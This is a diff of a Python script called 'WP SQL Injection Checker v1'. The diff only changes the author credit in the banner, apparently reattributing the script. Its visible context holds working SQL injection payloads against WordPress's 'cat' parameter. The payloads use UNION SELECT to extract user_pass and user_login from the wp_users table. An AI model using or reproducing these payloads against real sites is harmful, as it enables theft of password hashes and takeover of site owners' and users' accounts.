@@ -23,7 +23,7 @@ def timer():
  
 print "\n\t WP SQL Injection Checker v1"
 print "\t-----------------------------"
-print "\t     1337krz - code by Kro0oz"
+print "\t     1337krz - code by 0xr2r"
  
 sqls = ["index.php?cat=999%20UNION%20SELECT%20null,CONCAT(CHAR(58),user_pass,CHAR(58),user_login,CHAR(58)),null,null,null%20FROM%20wp_users/*",
 	"index.php?cat=%2527%20UNION%20SELECT%20CONCAT(CHAR(58),user_pass,CHAR(58),user_login,CHAR(58))%20FROM%20wp_users/*",
